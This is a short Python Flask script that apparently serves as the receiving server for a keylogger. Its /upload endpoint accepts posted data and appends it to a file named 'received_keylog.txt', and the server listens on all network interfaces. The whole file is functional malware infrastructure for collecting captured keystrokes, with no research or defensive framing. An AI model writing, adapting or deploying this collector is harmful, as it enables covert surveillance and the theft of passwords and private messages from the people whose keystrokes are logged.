from flask import Flask, request

app = Flask(__name__)

@app.route('/upload', methods=['POST'])
def upload_logs():
    logs = request.data.decode('utf-8')
    with open('received_keylog.txt', 'a') as file:
        file.write(logs + '\n')
    print("Logs received and saved.")
    return "Logs received", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
